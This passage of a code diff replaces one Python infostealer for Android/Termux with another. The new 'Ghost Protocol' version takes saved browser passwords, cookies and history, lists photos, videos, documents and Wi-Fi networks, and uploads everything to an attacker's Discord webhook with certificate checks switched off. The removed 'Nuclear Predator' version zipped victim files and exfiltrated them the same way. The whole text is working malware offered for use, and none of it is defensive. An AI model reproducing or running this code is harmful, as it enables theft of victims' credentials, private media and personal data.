+                    passwords.append(f"[{browser_name}] {url} | {username} = {decrypted[:30]}")
+        except:
+            pass
+        
+        conn.close()
+        os.remove(temp_db)
+    except:
+        pass
+    
+    return passwords
+
+def extract_history_from_db(browser_name, db_path):
+    """استخراج التاريخ من الداتابيس"""
+    history = []
+    
+    try:
+        temp_db = f"/data/data/com.termux/files/home/tmp_hist_{int(time.time())}.db"
+        subprocess.run(f"cp '{db_path}' '{temp_db}'", shell=True)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        try:
+            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
+            rows = cursor.fetchall()
+            
+            for url, title, timestamp in rows:
+                if url and title:
+                    history.append(f"[{browser_name}] {title[:50]} - {url[:80]}")
+        except:
+            pass
+        
+        conn.close()
+        os.remove(temp_db)
+    except:
+        pass
+    
+    return history
+
+# ════════ MEDIA AND FILE EXTRACTION ════════
+def extract_android_media():
+    """استخراج الوسائط من Android"""
+    media_data = {
+        'photos': [],
+        'videos': [],
+        'documents': [],
+        'screenshots': []
+    }
+    
+    # مسارات الوسائط في Android
+    media_paths = [
+        '/sdcard/DCIM/Camera',
+        '/sdcard/DCIM/Screenshots',
+        '/sdcard/Pictures',
+        '/sdcard/Download',
+        '/sdcard/Movies',
+        '/storage/emulated/0/DCIM/Camera'
+    ]
+    
+    for media_path in media_paths:
+        if os.path.exists(media_path):
+            try:
+                files = os.listdir(media_path)[:10]  # أول 10 ملفات فقط
+                
+                for file in files:
+                    file_lower = file.lower()
+                    file_path = os.path.join(media_path, file)
+                    
+                    if file_lower.endswith(('.jpg', '.jpeg', '.png', '.gif')):
+                        media_data['photos'].append(file_path)
+                    
+                    elif file_lower.endswith(('.mp4', '.avi', '.mov', '.mkv')):
+                        media_data['videos'].append(file_path)
+                    
+                    elif file_lower.endswith(('.pdf', '.doc', '.docx', '.xls', '.txt')):
+                        media_data['documents'].append(file_path)
+                    
+                    elif 'screenshot' in file_lower:
+                        media_data['screenshots'].append(file_path)
             except:
                 pass
-        
-        return tools
     
-    def get_termux_info(self):
-        """Get Termux information"""
-        info = {}
-        
-        if os.path.exists('/data/data/com.termux'):
-            info['installed'] = True
-            info['home_dir'] = os.path.expanduser('~')
-            
-            # Get $PREFIX
-            info['prefix'] = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
-        else:
-            info['installed'] = False
-        
-        return info
+    return media_data
+
+# ════════ DISCORD-STYLE REPORTING ════════
+def send_android_report():
+    """إرسال تقرير Android كامل"""
     
-    def harvest_screenshots(self):
-        """Harvest screenshots"""
-        print("\n[11] 📱 HARVESTING SCREENSHOTS...")
-        
-        screenshots = []
-        screenshot_dirs = [
-            '/sdcard/DCIM/Screenshots',
-            '/sdcard/Pictures/Screenshots',
-            '/storage/emulated/0/DCIM/Screenshots'
-        ]
-        
-        for ss_dir in screenshot_dirs:
-            if os.path.exists(ss_dir):
-                try:
-                    files = os.listdir(ss_dir)[:10]  # First 10 files
-                    for file in files:
-                        if 'screenshot' in file.lower() or file.lower().endswith(('.png', '.jpg')):
-                            file_path = os.path.join(ss_dir, file)
-                            try:
-                                size = os.path.getsize(file_path)
-                                if size < 5 * 1024 * 1024:  # 5MB limit
-                                    screenshots.append({
-                                        'path': file_path,
-                                        'name': file,
-                                        'size_mb': size // (1024 * 1024)
-                                    })
-                                    self.harvested_files.append(file_path)
-                                    self.total_size += size
-                            except:
-                                pass
-                except:
-                    pass
-        
-        print(f"    ✅ Screenshots: {len(screenshots)} found")
-        return screenshots
+    # جمع كل البيانات
+    system_info = get_android_system_info()
+    browser_data = extract_android_browser_data()
+    media_data = extract_android_media()
     
-    def analyze_storage(self):
-        """Analyze storage for large files"""
-        print("\n[12] 💾 ANALYZING STORAGE...")
+    # إنشاء تقرير
+    report = f"""
+╔══════════════════════════════════════════════════════════╗
+║                GHOST PROTOCOL - ANDROID EDITION         ║
+║                M1 EZ HAING NOW  PH                       ║
+╚══════════════════════════════════════════════════════════╝
+
+📱 **ANDROID SYSTEM INTELLIGENCE:**
+  Device ID: {system_info['device_id']}
+  Device: {system_info['device_name']}
+  User: {system_info['username']}
+  Android: {system_info['android_version']}
+  Rooted: {'✅ YES' if system_info['is_rooted'] else '❌ NO'}
+  Public IP: {system_info['network']['public_ip']}
+  Storage: {len(system_info['storage'])} partitions
+  Apps: {len(system_info['installed_apps'])} installed
+  Processes: {len(system_info['processes'])} running
+
+🌐 **BROWSER DATA HARVEST:**
+  Cookies: {len(browser_data['cookies'])} found
+  Passwords: {len(browser_data['passwords'])} found
+  History: {len(browser_data['history'])} entries
+  Bookmarks: {len(browser_data['bookmarks'])} saved
+
+📸 **MEDIA FILES DISCOVERED:**
+  Photos: {len(media_data['photos'])} images
+  Videos: {len(media_data['videos'])} videos
+  Documents: {len(media_data['documents'])} files
+  Screenshots: {len(media_data['screenshots'])} captures
+
+📶 **WIFI NETWORKS:**
+  {', '.join(system_info['network']['wifi'][:5]) if system_info['network']['wifi'] else 'No WiFi data'}
+
+⚡ **TERMUX ENVIRONMENT:**
+  Platform: {system_info['platform']}
+  Home: {LOCAL}
+  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+🔥 **GHOST PROTOCOL STATUS: ACTIVE**
+🎯 **OPERATOR: M1 EZ HAING NOW PH**
+✅ **ANDROID PENETRATION: SUCCESSFUL**
+"""
+    
+    # إرسال لـ Discord
+    send_to_discord(report)
+    
+    # إرسال ملفات إذا وجدت
+    send_detailed_files(browser_data, media_data, system_info)
+
+def send_to_discord(content):
+    """إرسال محتوى لـ Discord"""
+    try:
+        ssl._create_default_https_context = ssl._create_unverified_context
         
-        analysis = {
-            'large_files': [],
-            'recent_files': [],
-            'hidden_files': []
+        payload = {
+            "content": content,
+            "username": "Android Ghost Protocol",
+            "avatar_url": "https://i.imgur.com/7QqQjqG.png"
         }
         
-        # Find large files (>50MB)
-        try:
-            cmd = "find /sdcard -type f -size +50M 2>/dev/null | head -10"
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            if result.stdout:
-                files = result.stdout.strip().split('\n')
-                for file in files:
-                    if file:
-                        try:
-                            size = os.path.getsize(file) // (1024 * 1024)
-                            analysis['large_files'].append({'path': file, 'size_mb': size})
-                        except:
-                            pass
-        except:
-            pass
+        data = json.dumps(payload, ensure_ascii=False).encode('utf-8')
+        headers = {
+            'Content-Type': 'application/json; charset=utf-8',
+            'User-Agent': 'Mozilla/5.0 (Android Ghost)'
+        }
         
-        # Find recent files (last 24 hours)
-        try:
-            cmd = "find /sdcard -type f -mtime -1 2>/dev/null | head -10"
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            if result.stdout:
-                files = result.stdout.strip().split('\n')
-                for file in files:
-                    if file:
-                        analysis['recent_files'].append(file)
-        except:
-            pass
+        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
+        response = urllib.request.urlopen(req, timeout=15)
         
-        print(f"    ✅ Storage Analysis Complete")
-        return analysis
-    
-    def get_installed_apps(self):
-        """Get installed Android apps"""
-        print("\n[13] 📱 GETTING INSTALLED APPS...")
-        
-        apps = []
-        
-        # Try to get app list
-        try:
-            # For rooted devices
-            if os.path.exists('/system/bin/pm'):
-                result = subprocess.run("pm list packages", shell=True, capture_output=True, text=True)
-                if result.stdout:
-                    packages = result.stdout.strip().split('\n')
-                    apps = [pkg.replace('package:', '') for pkg in packages[:30]]
-            else:
-                # Check common app directories
-                app_dirs = [
-                    '/data/app',
-                    '/system/app',
-                    '/system/priv-app'
-                ]
-                
-                for app_dir in app_dirs:
-                    if os.path.exists(app_dir):
-                        try:
-                            dirs = os.listdir(app_dir)[:20]
-                            apps.extend(dirs)
-                        except:
-                            pass
-        except:
-            pass
-        
-        print(f"    ✅ Apps: {len(apps)} found")
-        return apps
-    
-    def create_mega_zip(self, all_data):
-        """Create ZIP file with harvested data"""
-        print("\n[14] 📦 CREATING MEGA ZIP ARCHIVE...")
-        
-        zip_buffer = io.BytesIO()
-        
-        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-            # Add JSON data
-            json_data = json.dumps(all_data, indent=2, ensure_ascii=False)
-            zip_file.writestr('nuclear_report.json', json_data)
-            
-            # Add text summary
-            summary = self.create_text_summary(all_data)
-            zip_file.writestr('summary.txt', summary)
-            
-            # Add harvested files (limited to avoid memory issues)
-            added_files = 0
-            for file_path in self.harvested_files[:20]:  # Limit to 20 files
-                try:
-                    if os.path.exists(file_path) and os.path.getsize(file_path) < 2 * 1024 * 1024:  # 2MB limit
-                        with open(file_path, 'rb') as f:
-                            zip_file.writestr(f'harvested/{os.path.basename(file_path)}', f.read())
-                            added_files += 1
-                except:
-                    pass
-            
-            # Add system info file
-            system_info = f"NUCLEAR HARVEST REPORT\nVictim ID: {VICTIM_ID}\n"
-            system_info += f"Time: {datetime.now().isoformat()}\n"
-            system_info += f"Total Files Harvested: {len(self.harvested_files)}\n"
-            system_info += f"Total Size: {self.total_size // (1024*1024)} MB\n"
-            zip_file.writestr('system_info.txt', system_info)
-        
-        print(f"    ✅ ZIP Created: {added_files} files added")
-        return zip_buffer.getvalue()
-    
-    def create_text_summary(self, data):
-        """Create text summary of harvested data"""
-        summary = []
-        summary.append("╔══════════════════════════════════════════════════════════╗")
-        summary.append("║                NUCLEAR HARVEST SUMMARY                   ║")
-        summary.append("╚══════════════════════════════════════════════════════════╝")
-        summary.append("")
-        summary.append(f"Victim ID: {VICTIM_ID}")
-        summary.append(f"Collection Time: {datetime.now().isoformat()}")
-        summary.append(f"Device: {data['system_info']['basic_info']['hostname']}")
-        summary.append(f"User: {data['system_info']['basic_info']['username']}")
-        summary.append(f"Public IP: {data['system_info']['network_info'].get('public_ip', 'Unknown')}")
-        summary.append("")
-        summary.append("📊 HARVEST STATISTICS:")
-        summary.append(f"  • Photos: {len(data['media_files']['photos'])}")
-        summary.append(f"  • Videos: {len(data['media_files']['videos'])}")
-        summary.append(f"  • Documents: {len(data['documents'])}")
-        summary.append(f"  • Screenshots: {len(data['screenshot_data'])}")
-        summary.append(f"  • Cookies: {len(data['cookies'])}")
-        summary.append(f"  • Search History: {len(data['search_history'])}")
-        summary.append(f"  • Hacking Tools: {len(data['system_info']['hacking_tools'])}")
-        summary.append(f"  • Installed Packages: {len(data['system_info']['installed_packages'])}")
-        summary.append(f"  • Browser Data Found: {sum(1 for b in data['browser_data'].values() if b['found'])}")
-        summary.append("")
-        summary.append("🔥 OPERATION: SUCCESSFUL")
-        summary.append("💀 M1 EZ HAING NOW PH - NUCLEAR PREDATOR v7.0")
-        
-        return "\n".join(summary)
-    
-    def send_nuclear_payload(self, data, zip_data):
-        """Send everything to Discord"""
-        print("\n[15] 🚀 SENDING NUCLEAR PAYLOAD TO DISCORD...")
-        
-        # First, send summary message
-        summary = self.create_text_summary(data)
-        
-        # Split summary if too long
-        if len(summary) > 2000:
-            parts = [summary[i:i+1900] for i in range(0, len(summary), 1900)]
-            for i, part in enumerate(parts, 1):
-                self.send_discord_message(f"```\n{part}\n``` Part {i}/{len(parts)}", "Nuclear Harvest Summary")
-        else:
-            self.send_discord_message(f"```\n{summary}\n```", "Nuclear Harvest Summary")
-        
-        time.sleep(1)
-        
-        # Send detailed sections
-        self.send_detailed_reports(data)
-        
-        time.sleep(1)
-        
-        # Send ZIP file
-        self.send_zip_file(zip_data)
-        
-        time.sleep(1)
-        
-        # Send final confirmation
-        final_msg = f"""✅ NUCLEAR HARVEST COMPLETE
-Victim ID: {VICTIM_ID}
-Total Files: {len(self.harvested_files)}
-Total Size: {self.total_size // (1024*1024)} MB
-Time: {datetime.now().strftime("%H:%M:%S")}
-Status: ALL DATA EXFILTRATED
-🔥 M1 EZ HAING NOW PH - SYSTEM OWNED"""
-        
-        self.send_discord_message(final_msg, "Mission Complete")
-        
-        print("\n" + "💀"*70)
-        print("💀 NUCLEAR HARVEST COMPLETE - ALL DATA SENT")
-        print("💀"*70)
-    
-    def send_detailed_reports(self, data):
-        """Send detailed reports"""
-        # Send system info
-        sys_info = f"""🖥️ SYSTEM INTELLIGENCE
-Device: {data['system_info']['basic_info']['hostname']}
-User: {data['system_info']['basic_info']['username']}
-Android: {data['system_info']['android_info'].get('android_version', 'Unknown')}
-IP: {data['system_info']['network_info'].get('public_ip', 'Unknown')}
-Hacking Tools: {', '.join(data['system_info']['hacking_tools'])}"""
-        
-        self.send_discord_message(sys_info, "System Intel")
-        
-        # Send media info
-        media_info = f"""📸 MEDIA HARVEST
-Photos: {len(data['media_files']['photos'])}
-Videos: {len(data['media_files']['videos'])}
-Screenshots: {len(data['screenshot_data'])}
-Documents: {len(data['documents'])}"""
-        
-        self.send_discord_message(media_info, "Media Report")
-        
-        # Send browser info
-        browsers_found = [browser for browser, info in data['browser_data'].items() if info['found']]
-        browser_info = f"""🌐 BROWSER DATA
-Browsers Found: {', '.join(browsers_found) if browsers_found else 'None'}
-Cookies: {len(data['cookies'])}
-Search History: {len(data['search_history'])} entries"""
-        
-        self.send_discord_message(browser_info, "Browser Report")
-    
-    def send_discord_message(self, content, username=None):
-        """Send message to Discord"""
-        try:
-            payload = {
-                "content": content
-            }
-            if username:
-                payload["username"] = username
-            
-            data = json.dumps(payload, ensure_ascii=False).encode('utf-8')
-            headers = {
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Nuclear Predator v7.0)'
-            }
-            
-            req = urllib.request.Request(self.webhook, data=data, headers=headers)
-            urllib.request.urlopen(req, timeout=15)
-            print(f"    ✅ {username} sent")
+        if response.status in [200, 204]:
+            print(f"[✅] Report sent! Status: {response.status}")
             return True
-        except Exception as e:
-            print(f"    ❌ Failed to send {username}: {str(e)[:50]}")
+        else:
+            print(f"[❌] Failed: {response.status}")
             return False
-    
-    def send_zip_file(self, zip_data):
-        """Send ZIP file to Discord"""
-        try:
-            # Discord requires multipart form for files
-            boundary = '----NuclearBoundary' + hashlib.md5(str(time.time()).encode()).hexdigest()
             
-            # Build multipart form
+    except Exception as e:
+        print(f"[❌] Error sending: {str(e)[:50]}")
+        return False
+
+def send_detailed_files(browser_data, media_data, system_info):
+    """إرسال ملفات مفصلة"""
+    
+    # 1. إرسال ملف بكوكيز البصفحات
+    if browser_data['cookies']:
+        cookies_file = create_temp_file("cookies.txt", browser_data['cookies'])
+        send_file_to_discord(cookies_file, "🍪 **ANDROID BROWSER COOKIES**")
+    
+    # 2. إرسال ملف بالباسوردات
+    if browser_data['passwords']:
+        passwords_file = create_temp_file("passwords.txt", browser_data['passwords'])
+        send_file_to_discord(passwords_file, "🔑 **ANDROID BROWSER PASSWORDS**")
+    
+    # 3. إرسال ملف بالتاريخ
+    if browser_data['history']:
+        history_file = create_temp_file("history.txt", browser_data['history'])
+        send_file_to_discord(history_file, "📜 **ANDROID BROWSER HISTORY**")
+    
+    # 4. إرسال ملف بالوسائط
+    media_report = []
+    media_report.append("📸 MEDIA FILES FOUND:")
+    
+    for category, files in media_data.items():
+        if files:
+            media_report.append(f"\n{category.upper()}:")
+            for i, file in enumerate(files[:5], 1):
+                media_report.append(f"{i}. {file}")
+    
+    if media_report:
+        media_file = create_temp_file("media.txt", media_report)
+        send_file_to_discord(media_file, "📁 **ANDROID MEDIA FILES**")
+    
+    # 5. إرسال ملف بالمعلومات
+    system_report = []
+    system_report.append("📱 SYSTEM INFORMATION:")
+    
+    for key, value in system_info.items():
+        if key not in ['processes', 'installed_apps', 'network', 'storage']:
+            system_report.append(f"{key}: {value}")
+    
+    system_file = create_temp_file("system.txt", system_report)
+    send_file_to_discord(system_file, "🖥️ **ANDROID SYSTEM INFO**")
+
+def create_temp_file(filename, content_list):
+    """إنشاء ملف مؤقت"""
+    temp_path = f"/data/data/com.termux/files/home/{filename}"
+    
+    with open(temp_path, 'w', encoding='utf-8') as f:
+        if isinstance(content_list, list):
+            for item in content_list:
+                f.write(f"{item}\n")
+        else:
+            f.write(str(content_list))
+    
+    return temp_path
+
+def send_file_to_discord(file_path, caption):
+    """إرسال ملف لـ Discord"""
+    try:
+        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+            with open(file_path, 'rb') as f:
+                file_content = f.read()
+            
+            # Discord requires multipart form
+            boundary = '----AndroidBoundary' + hashlib.md5(str(time.time()).encode()).hexdigest()
+            
             body = []
             body.append(f'--{boundary}')
-            body.append('Content-Disposition: form-data; name="file"; filename="nuclear_harvest.zip"')
-            body.append('Content-Type: application/zip')
+            body.append(f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"')
+            body.append(f'Content-Type: text/plain')
             body.append('')
-            body = '\r\n'.join(body).encode() + zip_data + f'\r\n--{boundary}--\r\n'.encode()
+            body = '\r\n'.join(body).encode() + file_content + f'\r\n--{boundary}--\r\n'.encode()
             
             headers = {
                 'Content-Type': f'multipart/form-data; boundary={boundary}',
                 'User-Agent': 'Mozilla/5.0'
             }
             
-            req = urllib.request.Request(self.webhook, data=body, headers=headers)
-            response = urllib.request.urlopen(req, timeout=30)
+            req = urllib.request.Request(WEBHOOK_URL, data=body, headers=headers)
+            urllib.request.urlopen(req, timeout=20)
             
-            print(f"    ✅ ZIP file sent! Status: {response.status}")
-            return True
+            print(f"[✅] File sent: {os.path.basename(file_path)}")
             
-        except Exception as e:
-            print(f"    ❌ Failed to send ZIP: {str(e)[:50]}")
-            return False
+            # تنظيف
+            os.remove(file_path)
+            
+    except Exception as e:
+        print(f"[❌] Failed to send file: {str(e)[:50]}")
 
 # ════════ MAIN EXECUTION ════════
 def main():
-    """Main execution"""
-    print("\n╔══════════════════════════════════════════════════════════╗")
-    print("║                M1 EZ HAING NOW  PH                       ║")
-    print("║            TERMUX NUCLEAR PREDATOR v7.0                  ║")
-    print("║        ULTIMATE DATA HARVEST - EVERYTHING               ║")
-    print("╚══════════════════════════════════════════════════════════╝")
+    """الدالة الرئيسية"""
+    print("\n" + "🔥"*70)
+    print("🔥 GHOST PROTOCOL - ANDROID TERMUX EDITION")
+    print("🔥 Converted from Windows with full power")
+    print("🔥"*70)
     
-    print("\n" + "⚠️"*70)
-    print("⚠️  WARNING: This tool harvests ALL data from the device!")
-    print("⚠️  Including: Photos, Videos, Documents, Passwords, Cookies")
-    print("⚠️  Search History, Browser Data, and EVERYTHING else!")
-    print("⚠️"*70)
+    print("\n[1] Checking Android environment...")
     
-    time.sleep(2)
-    
-    # Check webhook
-    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
-        print("\n❌ ERROR: Webhook not configured!")
-        print("ℹ️  Replace line 7 with your Discord webhook URL")
+    # التحقق من أننا في Termux
+    if not os.path.exists('/data/data/com.termux'):
+        print("[❌] Not running in Termux!")
         return
     
-    print("\n" + "🚀"*70)
-    print("🚀 STARTING NUCLEAR HARVEST - THIS MAY TAKE 2-3 MINUTES")
-    print("🚀"*70)
+    print("[✅] Running in Termux Android")
     
-    # Create harvester and run
-    harvester = NuclearHarvester()
+    # التحقق من الصلاحيات
+    print("[2] Checking permissions...")
+    
+    if not os.path.exists('/sdcard'):
+        print("[❌] No SDCard access - grant storage permission!")
+        print("[ℹ️] Run: termux-setup-storage")
+        return
+    
+    print("[✅] Storage permission granted")
+    
+    # التحقق من الإنترنت
+    print("[3] Checking internet connection...")
+    try:
+        urllib.request.urlopen("http://google.com", timeout=5)
+        print("[✅] Internet connection active")
+    except:
+        print("[❌] No internet connection!")
+        return
+    
+    # بدء عملية الحصاد
+    print("\n[4] Starting Android Ghost Protocol...")
     
     try:
-        start_time = time.time()
-        harvested_data = harvester.harvest_everything()
-        elapsed_time = time.time() - start_time
+        send_android_report()
+        print("\n" + "✅"*70)
+        print("✅ GHOST PROTOCOL COMPLETED SUCCESSFULLY")
+        print("✅ Check your Discord for Android intelligence")
+        print("✅"*70)
         
-        # Show final statistics
-        print("\n" + "📊"*70)
-        print("📊 NUCLEAR HARVEST COMPLETE - FINAL STATISTICS")
-        print("📊"*70)
-        
-        print(f"""
-✅ OPERATION SUCCESSFUL
-⏱️  Time Taken: {elapsed_time:.1f} seconds
-
-📈 HARVEST STATISTICS:
-  • Victim ID: {VICTIM_ID}
-  • Total Files Harvested: {len(harvester.harvested_files)}
-  • Total Data Size: {harvester.total_size // (1024*1024)} MB
-  • Photos: {len(harvested_data['media_files']['photos'])}
-  • Videos: {len(harvested_data['media_files']['videos'])}
-  • Documents: {len(harvested_data['documents'])}
-  • Screenshots: {len(harvested_data['screenshot_data'])}
-  • Cookies: {len(harvested_data['cookies'])}
-  • Search History: {len(harvested_data['search_history'])} entries
-  • Hacking Tools: {len(harvested_data['system_info']['hacking_tools'])}
-  • Browser Data Sets: {sum(1 for b in harvested_data['browser_data'].values() if b['found'])}
-
-💾 LOCAL BACKUP:
-  All data saved in memory and sent to Discord
-  ZIP file contains complete harvest
-
-🔍 CHECK YOUR DISCORD FOR:
-  1. Summary report
-  2. Detailed sections
-  3. ZIP file with harvested data
-  4. Final confirmation
-
-🔥 M1 EZ HAING NOW PH - NUCLEAR DOMINANCE ACHIEVED
-💀 SYSTEM COMPLETELY HARVESTED AND COMPROMISED
-""")
-        
-    except KeyboardInterrupt:
-        print("\n❌ HARVEST INTERRUPTED BY USER")
     except Exception as e:
-        print(f"\n❌ ERROR: {str(e)}")
+        print(f"[❌] Error: {str(e)}")
         import traceback
         traceback.print_exc()
 
 # ════════ QUICK TEST ════════
 def quick_test():
-    """Quick test function"""
+    """اختبار سريع"""
     print("\n" + "🔧"*35)
     print("QUICK TEST MODE")
     print("🔧"*35)
     
-    # Test webhook
     print("\n[1] Testing Discord webhook...")
     try:
-        test_msg = {"content": "🔧 NUCLEAR PREDATOR TEST\nTime: " + datetime.now().strftime("%H:%M:%S")}
+        test_msg = {"content": "🔥 GHOST PROTOCOL ANDROID TEST\nTime: " + datetime.now().strftime("%H:%M:%S")}
         data = json.dumps(test_msg).encode()
         headers = {'Content-Type': 'application/json'}
         
         req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
         response = urllib.request.urlopen(req, timeout=10)
         
-        print(f"✅ Webhook test passed! Status: {response.status}")
-        print("✅ Check Discord for test message")
+        print(f"[✅] Webhook test passed! Status: {response.status}")
         
     except Exception as e:
-        print(f"❌ Webhook test failed: {str(e)[:100]}")
+        print(f"[❌] Webhook test failed: {str(e)[:100]}")
     
-    # Test system info
-    print("\n[2] Testing system info collection...")
-    harvester = NuclearHarvester()
-    sys_info = harvester.get_system_intel()
-    print(f"✅ System info collected: {len(json.dumps(sys_info)):,} bytes")
-    print(f"✅ Device: {sys_info['basic_info']['hostname']}")
-    print(f"✅ IP: {sys_info['network_info'].get('public_ip', 'Unknown')}")
+    print("\n[2] Testing Android system info...")
+    sys_info = get_android_system_info()
+    print(f"[✅] System info collected")
+    print(f"    Device: {sys_info['device_name']}")
+    print(f"    Android: {sys_info['android_version']}")
+    print(f"    IP: {sys_info['network']['public_ip']}")
 
 # ════════ RUN SCRIPT ════════
 if __name__ == "__main__":
@@ -1172,19 +700,19 @@ if __name__ == "__main__":
     if len(sys.argv) > 1:
         if sys.argv[1] == "test":
             quick_test()
-        elif sys.argv[1] == "lite":
-            # Lite version
-            print("\nRunning lite version...")
-            main()
         elif sys.argv[1] == "help":
             print("""
 Usage:
-  python3 predator.py        # Run full nuclear harvest
-  python3 predator.py test   # Quick test mode
-  python3 predator.py lite   # Lite version
-  python3 predator.py help   # This message
+  python3 ghost_android.py        # Run full Android harvest
+  python3 ghost_android.py test   # Quick test mode
+  python3 ghost_android.py help   # This message
 
-⚠️  WARNING: Full version harvests ALL data from device!
+Features:
+  • Android system intelligence
+  • Browser data extraction
+  • Media file discovery
+  • WiFi network info
+  • Termux environment analysis
             """)
         else:
             main()
